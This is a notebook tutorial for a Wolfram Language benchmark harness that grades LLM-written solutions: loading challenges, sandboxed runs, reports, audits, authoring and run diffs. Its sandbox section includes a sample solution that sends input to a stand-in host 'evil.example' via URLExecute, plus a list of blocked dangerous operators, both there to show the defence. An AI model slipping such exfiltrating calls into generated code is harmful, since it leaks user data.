Notebook[{Cell["WolframChallengesBenchmark \[LongDash] Tutorial", "Title"], 
  Cell["End-to-end walkthrough for grading LLM-generated Wolfram Language \
solutions with the WolframChallengesLLMBenchmarkPaclet harness: load the \
canonical bank, run a model's solutions under sandboxed isolation, inspect \
typed results, render reports (HTML / Markdown / JSON / JUnit XML), audit a \
solutions directory, author your own challenges via the single-file JSONL \
format or .wlchallenge files, and compare two runs.", "Text"], 
  Cell["Every example below runs in-process against a tiny synthetic bank so \
you can follow along without a pre-existing solutions directory or a network \
connection. The tutorial is regenerated by scripts/BuildTutorial.wls; edit \
that script (not this notebook) to keep changes reproducible.", "Text"], 
  Cell["1. Load the paclet", "Section"], Cell["The harness ships as a regular \
Wolfram paclet under WolframChallengesLLMBenchmarkPaclet/. \
PacletDirectoryLoad makes its public symbols visible without a system-wide \
install, so you can run the tutorial directly from a fresh clone.", "Text"], 
  Cell[BoxData["$repoRoot = If[$Notebooks,\n    \
FileNameDrop[NotebookDirectory[], -1],\n    \
Directory[]];\nPacletDirectoryLoad[FileNameJoin[{$repoRoot, \
\"WolframChallengesLLMBenchmarkPaclet\"}]];\nNeeds[\"JofreEspigulePons`Wolfra\
mChallengesBenchmark`\"];"], "Input", InitializationCell -> True], 
  Cell["The public surface clusters into four groups:", "Text"], 
  Cell["Loaders \[LongDash] LoadChallengesJSONL (the canonical single-file \
loader), LoadChallenges + LoadTestBank (legacy back-compat), LoadSolutions, \
ReconcileNames.", "Item"], Cell["Generation + audit \[LongDash] \
GenerateSolutions, OpenRouterChatComplete, ExtractCode, SaveSolution, \
AuditSolutions.", "Item"], Cell["Runner + reports \[LongDash] RunBenchmark, \
DiffRuns, WriteReport, WriteJUnitReport, LiveDashboard.", "Item"], 
  Cell["Authoring \[LongDash] LoadWLChallenge, LoadChallengesDir, \
BuildTestBank, BuildChallengesJSONL, WriteTestBankFiles, \
WriteWLChallengeDir.", "Item"], Cell["2. Inspect the canonical bank", 
   "Section"], Cell["The bank lives in challenges.jsonl as one JSON record \
per line (HumanEval-shaped). Load it via LoadChallengesJSONL, which returns \
an Association with two keys: \"challenges\" (Association of task_id -> \
metadata) and \"testBank\" (Association of task_id -> list of typed test \
entries with held inputs).", "Text"], 
  Cell[BoxData["data       = LoadChallengesJSONL[FileNameJoin[{$repoRoot, \
\"challenges.jsonl\"}]];\nchallenges = data[\"challenges\"];\ntestBank   = \
data[\"testBank\"];\nLength[challenges]"], "Input", 
   InitializationCell -> True], Cell["Pick one challenge to inspect:", 
   "Text"], Cell[BoxData["challenges[\"FizzBuzz\"]"], "Input", 
   InitializationCell -> True], Cell[BoxData["testBank[\"FizzBuzz\"]"], 
   "Input", InitializationCell -> True], 
  Cell["3. Build a tiny synthetic bank", "Section"], 
  Cell["For the rest of the tutorial we'll work with a small in-memory bank \
so the examples run in milliseconds. The shape mirrors what \
LoadChallengesJSONL returns.", "Text"], 
  Cell[BoxData["miniChallenges = <|\n  \"AddTwo\" -> <|\"name\" -> \
\"AddTwo\", \"prompt\" -> \"Define addTwo[a,b]\"|>,\n  \"Square\" -> \
<|\"name\" -> \"Square\", \"prompt\" -> \"Define sq[x]\"|>\n|>;\nminiBank = \
<|\n  \"AddTwo\" -> {\n    <|\"challengeName\" -> \"AddTwo\",\n      \
\"input\"    -> HoldComplete[addTwo[2, 3]],\n      \"expected\" -> 5, \
\"metadata\" -> <||>|>,\n    <|\"challengeName\" -> \"AddTwo\",\n      \
\"input\"    -> HoldComplete[addTwo[10, 20]],\n      \"expected\" -> 30, \
\"metadata\" -> <||>|>},\n  \"Square\" -> {\n    <|\"challengeName\" -> \
\"Square\",\n      \"input\"    -> HoldComplete[sq[4]],\n      \"expected\" \
-> 16, \"metadata\" -> <||>|>}\n|>;\n{Length[miniChallenges], Total[Length /@ \
Values[miniBank]]}"], "Input", InitializationCell -> True], 
  Cell["4. Run a model under the sandbox", "Section"], 
  Cell["RunBenchmark takes the challenges, the test bank, and a solutions \
Association of task_id -> <|\"code\" -> sourceString|>. We'll hand it a \
correct solution for AddTwo and a deliberately broken one for Square to see \
both outcomes.", "Text"], Cell[BoxData["miniSolutions = <|\n  \"AddTwo\" -> \
<|\"code\" -> \"addTwo[a_, b_] := a + b\"|>,\n  \"Square\" -> <|\"code\" -> \
\"sq[x_] := First[{}]\"|>  (* deliberately bad *)\n|>;\n$tmp = \
FileNameJoin[{$TemporaryDirectory, \"wclb-tutorial-\" <> \
ToString[RandomInteger[10^9]]}];\nrun = RunBenchmark[\n  miniChallenges, \
miniBank, miniSolutions,\n  \"Model\"           -> \"tutorial-demo\",\n  \
\"OutputDirectory\" -> $tmp,\n  \"IsolationMode\"   -> \"InProcess\",\n  \
\"TimeConstraint\"  -> 5];\nrun[\"meta\", \"summary\"]"], "Input", 
   InitializationCell -> True], Cell["InProcess is the fastest isolation mode \
(no subkernel spinup) and fine for trusted, well-behaved code. Use \
\"PerTestKernel\" or \"PooledKernels\" when grading untrusted LLM output \
\[LongDash] those modes contain Aborts, Quits, infinite loops, and OOMs in a \
child kernel so a bad solution can't take the driver down.", "Text"], 
  Cell["The per-test typed results live in run[\"results\"]. Each entry is an \
Association with status, passed, durationSec, expected, actualOutput, \
messageCount, and error fields.", "Text"], 
  Cell[BoxData["#[[1]] -> #[[2]] & @@@ ({#[\"testId\"], #[\"status\"]} & /@ \
run[\"results\"])"], "Input", InitializationCell -> True], 
  Cell[BoxData[
    "First @ Select[run[\"results\"], #[\"passed\"] === False &]"], "Input", 
   InitializationCell -> True], Cell["5. Render reports", "Section"], 
  Cell["WriteReport emits an HTML, Markdown, JSON, and JUnit XML view of the \
run into a directory. The JUnit XML maps Evaluated+passed -> bare testcase, \
Evaluated+failed -> failure, NoSolution -> skipped, and everything else -> \
error \[LongDash] ready for any CI's test-report ingestion.", "Text"], 
  Cell[BoxData[
    "paths = WriteReport[run, run[\"runDir\"]];\nColumn[Values[paths]]"], 
   "Input", InitializationCell -> True], Cell["Open the HTML in a browser:", 
   "Text"], Cell[BoxData["SystemOpen[paths[\"html\"]]"], "Input", 
   InitializationCell -> True], Cell["6. Sandbox the LLM-generated code", 
   "Section"], Cell["LLM output is untrusted. The runner's sandbox \
Block-binds dangerous operators to a sentinel that returns $Failed without \
side effects \[LongDash] URLExecute, OpenWrite, Run, ToExpression, etc. Try \
grading a candidate that calls URLExecute and watch the sandbox swallow the \
side effect:", "Text"], Cell[BoxData["sandboxed = RunBenchmark[\n  \
<|\"Exfil\" -> <|\"name\" -> \"Exfil\", \"prompt\" -> \"f\"|>|>,\n  \
<|\"Exfil\" -> {<|\"challengeName\" -> \"Exfil\",\n                    \
\"input\" -> HoldComplete[f[1]],\n                    \"expected\" -> 1, \
\"metadata\" -> <||>|>}|>,\n  <|\"Exfil\" -> <|\"code\" -> \"f[x_] := \
URLExecute[\\\"https://evil.example/\\\" <> ToString[x]]\"|>|>,\n  \"Model\"  \
         -> \"tutorial-sandbox\",\n  \"OutputDirectory\" -> $tmp,\n  \
\"IsolationMode\"   -> \"InProcess\",\n  \"Sandbox\"         -> True,\n  \
\"TimeConstraint\"  -> 5];\nFirst[sandboxed[\"results\"]][\"actualOutput\"]"]\
, "Input", InitializationCell -> True], 
  Cell["7. Audit a solutions directory", "Section"], 
  Cell["Before a long benchmark run, AuditSolutions confirms each .wl file in \
solutions/<model>/ defines the function the test bank expects. Parsing is \
held \[LongDash] AuditSolutions never evaluates candidate code.", "Text"], 
  Cell[BoxData["solDir = FileNameJoin[{$tmp, \
\"audit-demo\"}];\nCreateDirectory[solDir];\nExport[FileNameJoin[{solDir, \
\"AddTwo.wl\"}],\n  \"someOtherFn[x_] := x^2\", \"Text\"];\naudit = \
AuditSolutions[solDir, miniBank];\naudit[\"ok\"]"], "Input", 
   InitializationCell -> True], Cell[BoxData["audit[\"mismatches\"]"], 
   "Input", InitializationCell -> True], Cell["8. Author your own challenge", 
   "Section"], Cell["Two authoring paths are supported. For a one-off, append \
a JSONL line to challenges.jsonl directly. For structured editing, write \
.wlchallenge files (see docs/WLCHALLENGE-FORMAT.md) and run \
BuildChallengesJSONL to refresh the bank.", "Text"], 
  Cell[BoxData["StringTake[\n  ExportString[\n    <|\"task_id\" -> \
\"ReverseList\",\n      \"name\" -> \"ReverseList\",\n      \"index\" -> \
167,\n      \"instruction\" -> \"Write Wolfram Language code...\",\n      \
\"prompt\" -> \"Reverse a list\\nDefine reverseList[lst].\",\n      \
\"entry_point\" -> \"reverseList\",\n      \"tests\" -> {\n        \
<|\"input_wl\" -> \"reverseList[{1, 2, 3}]\",\n          \"expected_wl\" -> \
\"{3, 2, 1}\",\n          \"metadata\" -> <||>|>}|>,\n    \"RawJSON\", \
\"Compact\" -> True],\n  120] <> \"...\""], "Input", 
   InitializationCell -> True], 
  Cell["End-to-end authoring with .wlchallenge files:", "Text"], 
  Cell["wolframscript -file scripts/BuildChallengesJSONL.wls --in \
.challenges", "Code"], Cell["9. Compare two runs", "Section"], 
  Cell["DiffRuns is the per-test diff between two runs of the same bank (by \
testId). CompareModels takes a list (or Association) of run directories and \
returns a per-challenge pass-rate matrix. Both surface regressions, fixes, \
and \"only this model passes\" / \"only this model fails\" buckets.", 
   "Text"], Cell[BoxData["solGood = <|\"AddTwo\" -> <|\"code\" -> \
\"addTwo[a_, b_] := a + b\"|>|>;\nsolBad  = <|\"AddTwo\" -> <|\"code\" -> \
\"addTwo[a_, b_] := a * b\"|>|>;\nrunGood = RunBenchmark[miniChallenges, \
miniBank, solGood,\n  \"Model\" -> \"good\", \"OutputDirectory\" -> $tmp,\n  \
\"IsolationMode\" -> \"InProcess\", \"TimeConstraint\" -> 5];\nrunBad  = \
RunBenchmark[miniChallenges, miniBank, solBad,\n  \"Model\" -> \"bad\",  \
\"OutputDirectory\" -> $tmp,\n  \"IsolationMode\" -> \"InProcess\", \
\"TimeConstraint\" -> 5];\ndiff = DiffRuns[runGood, \
runBad];\ndiff[\"summary\"]"], "Input", InitializationCell -> True], 
  Cell[BoxData["diff[\"regressions\"]"], "Input", 
   InitializationCell -> True], Cell["10. CLI workflow", "Section"], 
  Cell["Everything in this notebook has a CLI counterpart in scripts/. The \
minimal model run from the command line:", "Text"], 
  Cell["wolframscript -file scripts/RunBenchmark.wls \\\n  --solutions \
solutions/claude-opus-4.6 \\\n  --model     claude-opus-4.6", "Code"], 
  Cell["scripts/RunBenchmark.wls reads challenges.jsonl from the current \
directory by default; pass --jsonl path/to/challenges.jsonl to override. See \
scripts/RunBenchmark.wls --help for the full flag set (filtering, \
parallelism, sandbox toggle, baseline diff, fail-under threshold, JUnit \
override).", "Text"], Cell["11. Continuous integration", "Section"], 
  Cell[".github/workflows/tests.yml runs the paclet's VerificationTest suite \
on every push and pull request, plus a bank-self-test job that runs the \
canonical reference solutions against their own tests as a regression gate. \
See docs/ci-setup.md for the self-hosted runner setup and the (commented-out) \
Wolfram Engine Docker alternative.", "Text"], Cell["Where to next", 
   "Section"], Cell["docs/CHALLENGES-JSONL-FORMAT.md \[LongDash] full schema \
spec for challenges.jsonl + worked-example tutorial.", "Item"], 
  Cell["docs/WLCHALLENGE-FORMAT.md \[LongDash] grammar for the plain-text \
.wlchallenge authoring format.", "Item"], Cell["docs/ci-setup.md \[LongDash] \
runner setup, environment variables, optional Docker path.", "Item"], 
  Cell["WolframChallengesLLMBenchmarkPaclet/Documentation/English/ReferencePa\
ges/Symbols/ \[LongDash] per-symbol reference docs.", "Item"]}, 
 StyleDefinitions -> "Default.nb", WindowTitle -> 
  "WolframChallengesBenchmark Tutorial"]
